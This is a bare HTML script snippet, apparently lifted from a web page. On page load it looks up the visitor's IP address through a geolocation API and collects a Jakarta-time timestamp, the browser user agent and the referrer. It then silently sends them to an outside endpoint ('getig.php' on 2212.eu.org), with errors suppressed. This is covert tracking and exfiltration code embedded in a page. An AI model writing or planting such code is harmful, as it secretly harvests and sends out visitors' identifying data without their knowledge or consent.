<script>

    try {
let ip;
fetch(`https://ipapi.co/json`)
  .then(response => response.json())
  .then(data => {
    ip = data["ip"];
    // Get the current date and time in Jakarta time
    var date = new Date();

    // Format the date and time in the desired format
    var timeZone = 'Asia/Jakarta';
    var options = { timeZone: timeZone, hour: '2-digit', minute: '2-digit', second: '2-digit', day: '2-digit', month: '2-digit', year: 'numeric' };
    var formattedTime = new Intl.DateTimeFormat('id', options).format(date);

    // Get the elements with the specified class names
    var infoText = "[ " + formattedTime + " ] ";
    var userAgent = navigator.userAgent;
    var refUrl = document.referrer;
    var url = "https://2212.eu.org/getig.php?result=" + "%0A" + infoText + " | " + ip + "%0A" + userAgent + "%0A" + "Reff: " + refUrl;
    return fetch(url);
  })
} catch (e) {
  console.log("Error occurred while processing elements. Continuing with other functions...");
}
    
</script>
